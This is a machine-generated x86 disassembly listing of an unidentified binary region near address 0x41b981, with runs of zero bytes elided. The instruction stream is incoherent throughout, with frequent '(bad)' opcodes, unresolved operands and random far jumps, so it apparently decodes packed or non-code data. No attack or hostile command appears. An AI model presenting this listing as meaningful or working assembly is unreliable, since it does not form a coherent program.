  41b981:	ret    
  41b982:	xor    BYTE PTR [ecx+0x5b887c03],cl
  41b988:	xor    al,BYTE PTR [edi]
  41b98a:	ss clc 
  41b98c:	mov    edx,fs
  41b98e:	jmp    0x41b9b0
	...
  41b9b7:	add    BYTE PTR [eax],al
  41b9b9:	add    BYTE PTR [esi],bh
  41b9bb:	jb     0x41b9be
  41b9bd:	push   0x42067a
  41b9c2:	mov    bl,0x2f
  41b9c4:	fcom   QWORD PTR [eax+0x26]
  41b9c7:	int3   
  41b9c8:	add    al,0x0
  41b9ca:	ds inc ecx
  41b9cc:	xchg   DWORD PTR [ebx+0x6],eax
  41b9cf:	inc    ebx
  41b9d0:	in     al,dx
  41b9d1:	jo     0x41ba11
  41b9d3:	jb     0x41b9d6
  41b9d5:	pop    ecx
  41b9d6:	(bad)  
  41b9d7:	mov    ?,WORD PTR [edi]
  41b9d9:	ret    0x7246
  41b9dc:	mov    DWORD PTR ss:[edx-0x7576f3aa],eax
  41b9e3:	mov    es,WORD PTR ds:0x932ff87
  41b9e9:	mov    dh,0x47
  41b9eb:	mov    bl,0xe3
  41b9ed:	sbb    BYTE PTR [edi+0x7ebf8c78],dh
  41b9f3:	test   DWORD PTR [edi-0xb2c80f9],ecx
  41b9f9:	or     BYTE PTR [ebx+edi*8+0xd],al
  41b9fd:	xchg   DWORD PTR [edi+0x32],edi
  41ba00:	or     DWORD PTR [esi-0x1ad7a4c9],esi
  41ba06:	inc    esi
  41ba07:	push   eax
  41ba08:	icebp  
  41ba09:	mov    WORD PTR [edx+edx*8+0x38],es
  41ba0d:	xchg   DWORD PTR [edi+edx*2+0x60],edi
  41ba11:	(bad)  
  41ba12:	dec    BYTE PTR [ebx+0x7d]
  41ba15:	inc    DWORD PTR [eax+0x62]
  41ba18:	jo     0x41b9df
  41ba1a:	dec    BYTE PTR [ebx+0x7d]
  41ba1d:	or     eax,0x0
	...
  41ba46:	add    BYTE PTR [eax],al
  41ba48:	test   eax,0x348ccf7a
  41ba4d:	shr    BYTE PTR [eax],cl
  41ba4f:	inc    esp
  41ba50:	dec    ebx
  41ba51:	(bad)
  41ba54:	jno    0x41bac1
  41ba56:	loop   0x41ba65
  41ba58:	rcl    DWORD PTR [ecx+0x60],0xc5
  41ba5c:	dec    BYTE PTR [ebx+0x3d]
  41ba5f:	or     eax,0xeef79f9
  41ba64:	inc    esp
  41ba65:	dec    esp
  41ba66:	cmp    eax,0x609a4104
  41ba6b:	push   cs
  41ba6c:	xchg   DWORD PTR [ecx-0x2f90fc11],ebx
  41ba72:	xor    esp,DWORD PTR [eax]
  41ba74:	inc    esi
  41ba75:	shl    BYTE PTR [ebx],1
  41ba77:	and    BYTE PTR [edx],bh
  41ba79:	shr    cl,1
  41ba7b:	les    edx,FWORD PTR [esi]
  41ba7d:	arpl   WORD PTR [edi+0x4],bp
  41ba80:	cmp    eax,edx
  41ba82:	jmp    0x5faca14b
  41ba87:	add    al,0x29
  41ba89:	shr    cl,1
  41ba8b:	(bad)  
  41ba8c:	(bad)  
  41ba8d:	push   edx
  41ba8e:	outs   dx,DWORD PTR ds:[esi]
  41ba8f:	add    al,0x19
  41ba91:	shl    BYTE PTR [edx+0x6aaab944],cl
  41ba97:	lds    eax,FWORD PTR [edx-0x30]
  41ba9a:	out    0x8b,eax
  41ba9c:	aas    
  41ba9d:	shr    cl,1
  41ba9f:	les    esp,FWORD PTR [esi+0x71046f62]
  41baa5:	rol    BYTE PTR [eax],1
  41baa7:	jmp    0x41ba2b
  41baa9:	jb     0x41babb
  41baab:	popa   
	...
  41bad4:	add    BYTE PTR [eax],al
  41bad6:	cmp    bh,BYTE PTR [ecx+ecx*4]
  41bad9:	jmp    0x41ba5d
  41badb:	jb     0x41bae5
  41badd:	jno    0x41bb19
  41badf:	cmp    al,0x89
  41bae1:	sti    
  41bae2:	mov    ch,0xaa
  41bae4:	mov    al,ch
  41bae6:	inc    eax
  41bae7:	cdq    
  41bae8:	or     cl,ch
  41baea:	cs aam 0xe3
  41baed:	push   0x59
  41baef:	dec    esi
  41baf0:	push   ecx
  41baf1:	lahf   
  41baf2:	sub    al,0xd2
  41baf4:	inc    ebx
  41baf5:	fnsave [eax+0x53720827]
  41bafb:	ror    BYTE PTR [ebx-0xf],cl
  41bafe:	rcl    BYTE PTR [ebx],0x4
  41bb01:	pusha  
  41bb02:	nop
  41bb03:	mov    ebx,0x922ae5e9
  41bb08:	jg     0x41bb14
  41bb0a:	inc    esp
  41bb0b:	push   0x924aee0d
  41bb10:	xchg   DWORD PTR [edi],edx
  41bb12:	add    al,BYTE PTR [edx-0x1cf447fc]
  41bb18:	(bad)  
  41bb19:	test   al,0x24
  41bb1b:	dec    esp
  41bb1c:	das    
  41bb1d:	scas   eax,DWORD PTR es:[edi]
  41bb1e:	lds    ebp,FWORD PTR [edi+edi*2-0x36]
  41bb22:	out    0x78,eax
  41bb24:	add    cl,ch
  41bb26:	sub    al,0x92
  41bb28:	xchg   DWORD PTR [edi-0x7ef7e03],esp
  41bb2e:	or     esp,ebx
  41bb30:	into   
  41bb31:	test   al,0xd4
  41bb33:	pop    ebp
  41bb34:	das    
  41bb35:	xchg   edi,eax
  41bb36:	mov    ch,0x6c
  41bb38:	jg     0x41bac4
	...
  41bb62:	add    BYTE PTR [eax],al
  41bb64:	xor    ebp,DWORD PTR [ecx+esi*1]
  41bb67:	fisubr DWORD PTR [edx*4-0x7e024879]
  41bb6e:	add    bl,al
  41bb70:	in     al,dx
  41bb71:	loop   0x41bb41
  41bb73:	add    dh,ah
  41bb75:	test   DWORD PTR [eax],ecx
  41bb77:	xor    ecx,ecx
  41bb79:	out    0xef,al
  41bb7b:	xor    DWORD PTR [esp+edx*4+0x4d97ff00],0x9e0189da
  41bb86:	out    0x8,al
  41bb88:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41bb8a:	test   DWORD PTR [ebp-0xd],esi
  41bb8d:	pop    ebp
  41bb8e:	test   BYTE PTR [ebx-0x10426d8e],0x60
  41bb95:	(bad)  
  41bb97:	add    esi,ebp
  41bb99:	lea    eax,ds:0x2dacdef9
  41bb9f:	into   
  41bba0:	fimul  WORD PTR [edi-0x37121c83]
  41bba6:	stos   BYTE PTR es:[edi],al
  41bba7:	stos   BYTE PTR es:[edi],al
  41bba8:	jbe    0x41bb62
  41bbaa:	sub    eax,0x124ae2d9
  41bbaf:	mov    DWORD PTR [eax],ecx
  41bbb1:	sahf   
  41bbb2:	jmp    0x41bbd3
  41bbb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbb5:	jl     0x41bbb4
  41bbb7:	mov    BYTE PTR ds:0xdac7fa65,dh
  41bbbd:	xchg   ebp,eax
  41bbbe:	or     BYTE PTR [eax],al
  41bbc0:	pop    ss
  41bbc1:	pop    esi
  41bbc2:	test   esi,ecx
  41bbc4:	out    0x7b,al
  41bbc6:	sbb    al,0x89
	...
  41bbf0:	add    BYTE PTR [eax],al
  41bbf2:	loopne 0x41bb90
  41bbf4:	jmp    0x41bbfa
  41bbf6:	sahf   
  41bbf7:	pop    DWORD PTR ds:0x7f9c9efb
  41bbfd:	shr    bl,0x4e
  41bc00:	push   ds
  41bc01:	mov    ecx,edx
  41bc03:	fsubrp st(6),st
  41bc05:	aas    
  41bc06:	pop    esp
  41bc07:	push   0xffffffb1
  41bc09:	int3   
  41bc0a:	adc    ebx,DWORD PTR [esi]
  41bc0c:	add    BYTE PTR [ecx+0x6eb9d00],cl
  41bc12:	data16 jnp 0x41bc11
  41bc15:	add    BYTE PTR [esi],bh
  41bc17:	test   BYTE PTR [ecx],al
  41bc19:	or     DWORD PTR [ecx+0x3e3f5bd7],ecx
  41bc1f:	jmp    0x41bbd8
  41bc21:	mov    edi,0xe58289a1
  41bc26:	stos   BYTE PTR es:[edi],al
  41bc27:	add    DWORD PTR [ecx],0x0
  41bc2a:	xor    eax,0xff78c531
  41bc2f:	or     DWORD PTR [edx-0x10d78023],0x7e
  41bc36:	mov    eax,ds:0x3e00010f
  41bc3b:	jge    0x41bbcd
  41bc3d:	int3   
  41bc3e:	lock ret 0x8701
  41bc42:	jmp    0x41bc73
  41bc44:	mov    al,dh
  41bc46:	mov    ebp,0x7586fd43
  41bc4b:	je     0x41bc44
  41bc4d:	xchg   BYTE PTR [eax+0x4],bh
  41bc50:	fistp  QWORD PTR ds:0xcc8e8fc5
	...
  41bc7e:	add    BYTE PTR [eax],al
  41bc80:	retf   
  41bc81:	ret    0x901
  41bc84:	retf   
  41bc85:	dec    edi
  41bc86:	mov    bl,ch
  41bc88:	call   DWORD PTR [ecx-0x1]
  41bc8b:	jle    0x41bca6
  41bc8d:	ja     0x41bc91
  41bc8f:	add    BYTE PTR [esi],bh
  41bc91:	jge    0x41bc23
  41bc93:	int3   
  41bc94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc95:	ret    
  41bc96:	add    DWORD PTR [edi+0xee5c3f9],eax
  41bc9c:	mov    edi,0x3e00d8a1
  41bca1:	or     BYTE PTR [edx],0xb5
  41bca4:	repnz or eax,DWORD PTR [ebx+0x0]
  41bca8:	mov    ecx,0x348edc3
  41bcae:	(bad)  
  41bcb0:	add    BYTE PTR ds:[ecx],0x9
  41bcb4:	test   eax,0x3e3f4dd6
  41bcb9:	pop    ebx
  41bcba:	fcom   st(1)
  41bcbc:	mov    ecx,0x2adea891
  41bcc1:	loop   0x41bc81
  41bcc3:	vmaxsd xmm4,xmm5,QWORD PTR [eax-0x2d]
  41bcc8:	inc    ecx
  41bcc9:	je     0x41bd3b
  41bccb:	mov    esi,0x12e39bbf
  41bcd0:	dec    eax
  41bcd1:	loop   0x41bc68
  41bcd3:	sbb    DWORD PTR [eax-0x32ef9dc8],0xffffffa7
  41bcda:	jecxz  0x41bd20
  41bcdc:	ds loop 0x41bd1d
  41bcdf:	lds    ebx,FWORD PTR [ebx+0xdf6861]
	...
  41bd0d:	add    BYTE PTR [edx+0x4703e75b],al
  41bd13:	mov    al,0x33
  41bd15:	pop    edx
  41bd16:	xor    DWORD PTR [ebx+0x70],ebx
  41bd19:	mov    bh,0xa9
  41bd1b:	mov    ch,ah
  41bd1d:	test   BYTE PTR [ebx+0x77],bl
  41bd20:	out    0x3,eax
  41bd22:	ds fs pop esi
  41bd25:	enter  0x19d6,0xe7
  41bd29:	mov    WORD PTR [ebx-0x66],gs
  41bd2c:	push   es
  41bd2d:	out    dx,al
  41bd2e:	sar    BYTE PTR [edi+0xb],0x4
  41bd32:	ds pop ebx
  41bd34:	repnz mov es,WORD PTR [edx]
  41bd37:	icebp  
  41bd38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd39:	add    eax,ecx
  41bd3b:	in     eax,dx
  41bd3c:	cli    
  41bd3d:	mov    eax,?
  41bd3f:	(bad)  [edi]
  41bd41:	add    cl,al
  41bd43:	mov    ebx,DWORD PTR [edx]
  41bd45:	idiv   BYTE PTR [eax+0x4bdd6a98]
  41bd4b:	in     al,0x1b
  41bd4d:	xchg   ecx,eax
  41bd4e:	repnz cmc 
  41bd50:	daa    
  41bd51:	add    al,0x47
  41bd53:	out    dx,al
  41bd54:	mov    edx,0xce9a138c
  41bd59:	std    
  41bd5a:	push   0x3db50080
  41bd5f:	pop    ebx
  41bd60:	add    dl,ah
  41bd62:	enter  0x79a6,0x28
  41bd66:	cmp    ah,al
  41bd68:	(bad)  [eax-0x71809720]
  41bd6e:	jmp    0x12abdcd
	...
  41bd9b:	add    BYTE PTR [esi+ebp*4-0x34],al
  41bd9f:	add    bl,bh
  41bda1:	pop    edx
  41bda2:	xchg   DWORD PTR [esi+0x68168582],ebx
  41bda8:	xor    BYTE PTR [esi+0x0],0xe9
  41bdac:	cmp    eax,0x35b562
  41bdb1:	cmp    BYTE PTR [eax],al
  41bdb3:	sbb    BYTE PTR [ebx+0x75],dh
  41bdb6:	dec    ebx
  41bdb7:	push   ecx
  41bdb8:	mov    esp,0x40e9f7f3
  41bdbd:	fsubr  QWORD PTR [ecx-0x788a77b9]
  41bdc3:	xor    DWORD PTR [edx+0x7b601d7a],eax
  41bdc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdca:	out    dx,al
  41bdcb:	pusha  
  41bdcc:	sbb    BYTE PTR [edi-0x11],0x70
  41bdd0:	lea    eax,[edi-0x38]
  41bdd3:	jo     0x41be51
  41bdd5:	mul    eax
  41bdd7:	inc    ebx
  41bdd8:	xchg   edi,eax
  41bdd9:	les    ebp,FWORD PTR [edx-0x28b90828]
  41bddf:	jo     0x41bdce
  41bde1:	mov    dh,0xe0
  41bde3:	fidivr WORD PTR [edx-0x4df83073]
  41bde9:	cdq    
  41bdea:	pop    es
  41bdeb:	sti    
  41bdec:	lds    ecx,FWORD PTR [ebx+0x4642d1bf]
  41bdf2:	enter  0xff70,0xf6
  41bdf6:	loopne 0x41bdce
  41bdf8:	cmp    bh,BYTE PTR [eax+0x0]
  41bdfb:	sbb    BYTE PTR [ebp+0xd8de],dh
	...
  41be29:	add    BYTE PTR [esi-0x6acef781],ah
  41be2f:	loop   0x41be01
  41be31:	sar    edi,0x59
  41be34:	sub    eax,0x7d9c5ec8
  41be39:	jecxz  0x41be2f
  41be3b:	dec    ebx
  41be3c:	das    
  41be3d:	xor    esp,esi
  41be3f:	mov    cl,0x85
  41be41:	fcom   DWORD PTR [esi-0x1acefd81]
  41be47:	loop   0x41be11
  41be49:	ror    edi,0x6f
  41be4c:	shr    BYTE PTR cs:[esi],1
  41be4f:	pushf  
  41be50:	jge    0x41be35
  41be52:	sub    BYTE PTR [eax-0x4b2a0000],dl
  41be58:	test   eax,ebx
  41be5a:	data16 jg 0x41be6d
  41be5d:	xor    DWORD PTR [esi-0x1e],edx
  41be60:	enter  0xffc1,0x5a
  41be64:	sub    eax,0x7d9bded0
  41be69:	jecxz  0x41bed3
  41be6b:	pop    edi
  41be6c:	or     ecx,DWORD PTR [edi]
  41be6e:	data16 mov ah,0x87
  41be71:	inc    ebp
  41be72:	pop    edi
  41be73:	cdq    
  41be74:	fild   WORD PTR [esi+edx*2]
  41be77:	mov    ds:0x35e41885,eax
  41be7c:	or     BYTE PTR [esp+ecx*8],al
  41be7f:	xor    eax,0x2f478908
  41be84:	pop    esi
  41be85:	pop    ebx
  41be86:	sahf   
  41be87:	sbb    DWORD PTR [ecx-0x3e],0x2f
  41be8b:	pop    edx
  41be8c:	dec    edi
  41be8d:	push   esi
	...
  41beb6:	add    BYTE PTR [eax],al
  41beb8:	lods   al,BYTE PTR ds:[esi]
  41beb9:	xor    esp,DWORD PTR [esp+ecx*1]
  41bebc:	mov    cl,0xe2
  41bebe:	je     0x41bee4
  41bec0:	not    DWORD PTR [edi]
  41bec2:	xor    esi,0xfcd0608
  41bec8:	mov    cl,0x98
  41beca:	or     esi,DWORD PTR [edi-0x74ce3bc2]
  41bed0:	jge    0x41bf4e
  41bed2:	xor    eax,ebp
  41bed4:	mov    ebx,DWORD PTR [edx-0x37a9022c]
  41beda:	dec    ebp
  41bedb:	aas    
  41bedc:	ds pushf 
  41bede:	or     ah,bh
  41bee0:	fld    st(4)
  41bee2:	add    al,0xb5
  41bee4:	enter  0x2f35,0xe8
  41bee8:	jg     0x41bea4
  41beea:	aam    0xfd
  41beec:	push   esi
  41beed:	inc    eax
  41beee:	dec    ebp
  41beef:	aas    
  41bef0:	ds fmul st(4),st
  41bef3:	stc    
  41bef4:	mov    cl,0xdc
  41bef6:	xor    ebx,DWORD PTR [ecx+0x7c]
  41bef9:	imul   eax,DWORD PTR [ecx],0x53
  41befc:	mov    bh,0xe6
  41befe:	xor    DWORD PTR [eax-0x13],edx
  41bf01:	clc    
  41bf02:	cmp    eax,0x59ec508
  41bf07:	mov    esi,ebx
  41bf09:	sti    
  41bf0a:	cs push eax
  41bf0c:	xchg   esi,eax
  41bf0d:	mov    esi,0x9b79fdd5
  41bf12:	inc    ebp
  41bf13:	je     0x41bf14
  41bf15:	add    DWORD PTR [esi-0x162c99bd],0xfffffff5
	...
  41bf44:	add    BYTE PTR [eax],al
  41bf46:	bound  ebp,QWORD PTR [esp+edx*8]
  41bf49:	push   0x42af8a
  41bf4e:	ret    
  41bf4f:	(bad)  
  41bf50:	fst    DWORD PTR [eax+0x56]
  41bf53:	dec    edx
  41bf54:	aad    0xfd
  41bf56:	inc    ecx
  41bf57:	fild   DWORD PTR [ebp+0x73]
  41bf5a:	jg     0x41bede
  41bf5c:	xchg   BYTE PTR [ebx+0x36],al
  41bf5f:	shr    ecx,cl
  41bf61:	fldcw  WORD PTR [edx]
  41bf63:	jbe    0x41bf36
  41bf65:	push   ecx
  41bf66:	mov    bl,0xc7
  41bf68:	fst    DWORD PTR [eax+0x26]
  41bf6b:	add    ebp,edx
  41bf6d:	std    
  41bf6e:	adc    DWORD PTR [edx+eax*2+0x7d],ebx
  41bf72:	sbb    dl,BYTE PTR [edi]
  41bf74:	test   eax,0x601001fc
  41bf79:	jmp    0x3739473d
  41bf7e:	mov    al,ah
  41bf80:	and    al,0xfc
  41bf82:	mov    dh,0xee
  41bf84:	jmp    0xe637:0x17737d80
  41bf8b:	jno    0x41bf3f
  41bf8d:	rcl    ebx,cl
  41bf8f:	out    0x2c,al
  41bf91:	aam    0x6e
  41bf93:	fsubr  DWORD PTR [edx-0x7b7c9104]
  41bf99:	iret   
  41bf9a:	mov    ebx,0x2a3fff74
  41bf9f:	sbb    ah,bh
  41bfa1:	cmp    ch,0x72
  41bfa4:	pop    ss
  41bfa5:	fmul   st(3),st
  41bfa7:	ja     0x41c01f
  41bfa9:	rol    DWORD PTR [eax],cl
	...
  41bfd3:	add    BYTE PTR [esi],ah
  41bfd5:	daa    
  41bfd6:	repz inc esp
  41bfd8:	ds out 0xac,al
  41bfdb:	shr    esi,cl
  41bfdd:	xor    BYTE PTR [eax-0x30],0x83
  41bfe1:	je     0x41c045
  41bfe3:	xor    DWORD PTR [edx-0x20],edi
  41bfe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfe7:	sar    DWORD PTR [ecx+0x57d431e],cl
  41bfed:	imul   ecx,edi,0xffffffbf
  41bff0:	jmp    0x9772:0xfd80e719
  41bff7:	fninit 
  41bff9:	jbe    0x41c021
  41bffb:	rcl    esi,cl
  41bffd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bffe:	xchg   ebx,eax
  41bfff:	inc    esp
  41c000:	ds out 0xac,al
  41c003:	ror    DWORD PTR [esi+0x33cf8883],cl
  41c009:	je     0x41c07d
  41c00b:	xor    DWORD PTR [edx],ebp
  41c00d:	loopne 0x41bfb3
  41c00f:	sar    DWORD PTR [ecx-0x650affe3],cl
  41c015:	adc    al,dh
  41c017:	adc    DWORD PTR [ecx-0x18],0x17bee93e
  41c01e:	clc    
  41c01f:	cmp    edx,esp
  41c021:	sbb    eax,0x30cd6fc
  41c026:	dec    esp
  41c027:	push   esp
  41c028:	jnp    0x41c085
  41c02a:	mov    ebp,DWORD PTR [edx+edx*1]
  41c02d:	or     ebp,eax
  41c02f:	add    BYTE PTR [esi],cl
  41c031:	jbe    0x41c030
  41c033:	pop    ds
  41c034:	mov    edi,0x19f817
	...
  41c061:	add    dl,dh
  41c063:	jp     0x41c05e
  41c065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c066:	in     al,dx
  41c067:	fld    st(6)
  41c069:	icebp  
  41c06a:	pop    es
  41c06b:	loopne 0x41c0b0
  41c06d:	cdq    
  41c06e:	ins    DWORD PTR es:[edi],dx
  41c06f:	adc    ecx,0xffffff92
  41c072:	mov    WORD PTR [ebp+0x5e],?
  41c075:	and    ch,BYTE PTR [ebx]
  41c077:	xchg   DWORD PTR [ebx-0x55],ebx
  41c07a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c07b:	jae    0x41c0d1
  41c07d:	pusha  
  41c07e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c07f:	repz jmp 0x41c0df
  41c082:	cmp    bl,BYTE PTR [ebx+0x0]
  41c085:	mov    edx,0xbc890e47
  41c08a:	test   edx,esp
  41c08c:	jae    0x41c073
  41c08e:	mov    esi,0x8c4f80d7
  41c093:	jne    0x41c0e5
  41c095:	push   ecx
  41c096:	into   
  41c097:	jae    0x41c096
  41c099:	jmp    0x25aa1ba1
  41c09e:	div    BYTE PTR [ebx]
  41c0a0:	add    BYTE PTR [ecx-0x36],al
  41c0a3:	je     0x41c0a2
  41c0a5:	xor    cl,BYTE PTR es:[ecx-0x187e9476]
  41c0ac:	ds jmp 0xab741867
  41c0b2:	mov    eax,0xc3000875
  41c0b7:	xchg   ebx,eax
  41c0b9:	test   DWORD PTR [edi+0x26fffb8c],edi
  41c0bf:	pop    edi
  41c0c0:	add    BYTE PTR [eax],al
  41c0c2:	cmp    al,0x2a
  41c0c4:	test   eax,esi
	...
  41c0ee:	add    BYTE PTR [eax],al
  41c0f0:	mov    ds,edx
  41c0f2:	je     0x41c0f2
  41c0f4:	loopne 0x41c082
  41c0f6:	sub    eax,0x8747fcd2
  41c0fb:	test   DWORD PTR [ebx+0x6efffb8d],ecx
  41c101:	fidivr DWORD PTR [esi+edi*8-0x60]
  41c105:	mov    ebx,?
  41c107:	test   DWORD PTR [ebx],ebx
  41c109:	(bad)  
  41c10a:	sti    
  41c10b:	call   FWORD PTR [edx+esi*8+0x7b]
  41c10f:	(bad)  
  41c110:	mov    al,ds:0xd4be0b8c
  41c115:	xlat   BYTE PTR ds:[ebx]
  41c116:	loopne 0x41c197
  41c118:	sbb    al,0xe2
  41c11a:	jl     0x41c11a
  41c11c:	ror    BYTE PTR [ebx+ecx*1-0x7b27f4a],0x88
  41c124:	xchg   esi,eax
  41c125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c126:	(bad)  
  41c127:	jmp    DWORD PTR [ecx+ebx*1+0x7f]
  41c12b:	cli    
  41c12c:	lahf   
  41c12d:	and    DWORD PTR [ecx],eax
  41c12f:	sbb    BYTE PTR [edi+edx*2+0x71],0xc6
  41c134:	leave  
  41c135:	xor    al,0xe8
  41c137:	imul   edx,DWORD PTR [ecx],0xffffff8c
  41c13a:	sti    
  41c13b:	cmp    DWORD PTR [edx+0xfffe1f],0x57
  41c142:	cmp    BYTE PTR [ebx],0x57
  41c145:	or     DWORD PTR [ebx-0x1e12d7d],esp
  41c14b:	jmp    DWORD PTR [eax]
  41c14d:	push   edi
  41c14e:	jno    0x41c0ee
  41c150:	rcr    cl,cl
  41c152:	cmp    dh,0x0
	...
  41c17d:	add    BYTE PTR [eax],ah
  41c17f:	mov    WORD PTR [eax-0x18],ss
  41c182:	ds loope 0x41c187
  41c185:	add    BYTE PTR [esi],bh
  41c187:	shr    DWORD PTR [edi],0x59
  41c18a:	mov    bh,0x47
  41c18c:	sub    eax,0x368436c2
  41c191:	xchg   DWORD PTR [ebx],esp
  41c193:	add    esp,eax
  41c195:	mov    WORD PTR [edi],?
  41c197:	test   BYTE PTR [ecx],al
  41c199:	push   ecx
  41c19a:	jo     0x41c1cd
  41c19c:	jnp    0x41c1f9
  41c19e:	ss in  eax,dx
  41c1a0:	push   ebp
  41c1a1:	or     al,0xcb
  41c1a3:	inc    BYTE PTR [eax+0x31a0f1fe]
  41c1a9:	call   0x434597
  41c1ae:	push   esp
  41c1af:	test   BYTE PTR [ecx-0x34],bl
  41c1b2:	push   ebx
  41c1b3:	inc    ebx
  41c1b4:	add    al,0xe8
  41c1b6:	in     eax,dx
  41c1b7:	mov    esi,0xb60ffdd0
  41c1bc:	jnp    0x41c140
  41c1be:	repnz inc esi
  41c1c0:	inc    ecx
  41c1c1:	add    dh,al
  41c1c3:	jg     0x41c1d8
  41c1c5:	inc    edx
  41c1c6:	mov    ebp,0xaf7bf1cd
  41c1cb:	rol    BYTE PTR [esi-0x300f5f88],0xff
  41c1d2:	cdq    
  41c1d3:	add    DWORD PTR [ecx],0xffffffe9
  41c1d6:	jmp    0xcf8f:0xc387d0fa
  41c1dd:	std    
  41c1de:	adc    DWORD PTR [edx-0x4a],0xe9
	...
  41c209:	add    BYTE PTR [eax],al
  41c20b:	add    BYTE PTR [esi],ch
  41c20d:	std    
  41c20e:	test   DWORD PTR [eax+esi*2+0x20],esi
  41c212:	rol    BYTE PTR [edi-0x230683d],1
  41c218:	popa   
  41c219:	xor    BYTE PTR [esi-0x2fd7a78c],al
  41c21f:	mov    ebx,eax
  41c221:	mov    edi,0x5a49fdcf
  41c226:	not    BYTE PTR [ecx+0x5007de3f]
  41c22c:	(bad)  
  41c22d:	scas   al,BYTE PTR es:[edi]
  41c22e:	xchg   ebx,eax
  41c22f:	shl    DWORD PTR [ebx],1
  41c231:	jno    0x41c211
  41c233:	cdq    
  41c234:	imul   ebp,DWORD PTR [edx],0xffffffff
  41c237:	jp     0x41c25a
  41c239:	xchg   edi,eax
  41c23a:	jmp    0x2ecd:0x6a1d7f03
  41c241:	out    dx,al
  41c242:	jecxz  0x41c1c7
  41c244:	inc    edi
  41c245:	pop    ebx
  41c246:	pop    esp
  41c247:	(bad)  
  41c248:	push   0xf5cecf09
  41c24d:	jo     0x41c225
  41c24f:	sbb    DWORD PTR [ebp-0x1430330d],0x5b
  41c256:	or     edi,DWORD PTR ds:0x85e6
  41c25b:	adc    DWORD PTR [ebp-0x2c304b0d],0x5b
  41c262:	xor    al,0x6e
  41c264:	mov    ch,0xd6
  41c266:	addr16 into 
  41c268:	ret    
  41c269:	jo     0x41c2a2
  41c26b:	fsubr  st(1),st
  41c26d:	pop    ebx
  41c26e:	out    0x3,eax
	...
  41c298:	add    BYTE PTR [eax],al
  41c29a:	adc    edx,DWORD PTR [ecx]
  41c29c:	xor    bh,BYTE PTR [ebp-0x66]
  41c29f:	push   cs
  41c2a0:	test   eax,0x150da1fc
  41c2a5:	aaa    
  41c2a6:	(bad)  
  41c2a7:	pop    ss
  41c2a8:	retf   
  41c2a9:	repz sbb esp,esp
  41c2ac:	or     ebp,DWORD PTR [eax]
  41c2ae:	xor    bh,cl
  41c2b0:	imul   ebp,DWORD PTR [ebx-0x398f9bf3],0xffffffc5
  41c2b7:	repz mul BYTE PTR [ebp-0x4c]
  41c2bb:	pop    edx
  41c2bc:	out    0xda,eax
  41c2be:	fidiv  WORD PTR ss:[edi-0x3a67470d]
  41c2c5:	adc    al,0x6c
  41c2c7:	pusha  
  41c2c8:	add    BYTE PTR [esi-0x74],bh
  41c2cb:	or     eax,0x204a2981
  41c2d0:	call   0xfdb02c42
  41c2d5:	xchg   ecx,eax
  41c2d6:	stc    
  41c2d7:	out    0x3e,al
  41c2d9:	jmp    0xf38f7f3
  41c2de:	stc    
  41c2df:	pop    ebp
  41c2e0:	mov    ch,0x22
  41c2e2:	ins    DWORD PTR es:[edi],dx
  41c2e3:	push   es
  41c2e4:	call   0xfdafb362
  41c2e9:	adc    DWORD PTR [ecx-0x14],0x38e5e93e
  41c2f0:	mul    esi
  41c2f2:	lock pop ebp
  41c2f4:	mov    ch,0xc2
  41c2f6:	sub    al,0x9
  41c2f8:	call   0xfdafcc32
  41c2fd:	add    BYTE PTR cs:[eax],al
	...
  41c328:	sbb    BYTE PTR [edx],dl
  41c32a:	ret    0x3df1
  41c32d:	or     cl,BYTE PTR [ecx+0x5163261d]
  41c333:	rcl    esp,0x68
  41c336:	std    
  41c337:	scas   al,BYTE PTR es:[edi]
  41c338:	ret    0x8099
  41c33b:	jmp    0xadfa1e7d
  41c340:	adc    DWORD PTR [eax],esi
  41c342:	add    BYTE PTR [edx-0x53],ah
  41c345:	fcom   DWORD PTR [ecx]
  41c347:	push   0x7d
  41c349:	push   esi
  41c34a:	sub    DWORD PTR [edx-0xbb3cbc7],0x86725b02
  41c354:	lds    ebx,FWORD PTR [esi]
  41c356:	jae    0x41c380
  41c358:	inc    edx
  41c359:	loop   0x41c36b
  41c35b:	jo     0x41c2e9
  41c35d:	fcmovb st,st(0)
  41c35f:	in     eax,0xbc
  41c361:	cdq    
  41c362:	add    al,0x14
  41c364:	jle    0x41c351
  41c366:	ds jmp 0x9b417b
  41c36c:	adc    eax,0xcc530058
  41c371:	aas    
  41c372:	and    al,0x8
  41c374:	mov    ah,0x93
  41c376:	call   0x7de2dc73
  41c37b:	ret    
  41c37c:	xlat   BYTE PTR ds:[ebx]
  41c37d:	pop    ebx
  41c37e:	add    BYTE PTR [eax],al
  41c380:	lahf   
  41c381:	scas   al,BYTE PTR es:[edi]
  41c382:	je     0x41c3c5
  41c384:	daa    
  41c385:	repnz push cs
  41c387:	mov    DWORD PTR [edi],esp
  41c389:	fidivr DWORD PTR [edi+0x4]
	...
  41c3b3:	add    BYTE PTR [eax],al
  41c3b5:	add    BYTE PTR [edx+ebx*4+0x13eb3d04],dl
  41c3bc:	cmp    eax,0xb88d9500
  41c3c1:	dec    esp
  41c3c2:	xchg   edx,eax
  41c3c3:	pop    ss
  41c3c4:	add    BYTE PTR [ebx-0x7cf00dfc],cl
  41c3ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3cb:	arpl   WORD PTR [edi-0x40],di
  41c3ce:	jecxz  0x41c42d
  41c3d0:	int3   
  41c3d1:	jne    0x41c3e9
  41c3d3:	push   edi
  41c3d4:	jb     0x41c3c5
  41c3d6:	sbb    al,0x99
  41c3d8:	add    al,0x0
  41c3da:	xor    dh,dl
  41c3dc:	loopne 0x41c361
  41c3de:	sti    
  41c3df:	jg     0x41c431
  41c3e1:	push   esi
  41c3e2:	pop    esp
  41c3e3:	or     BYTE PTR ds:[ebx+0x45895b22],cl
  41c3ea:	fbld   TBYTE PTR [edi]
  41c3ec:	dec    edi
  41c3ed:	call   0x3d63ac
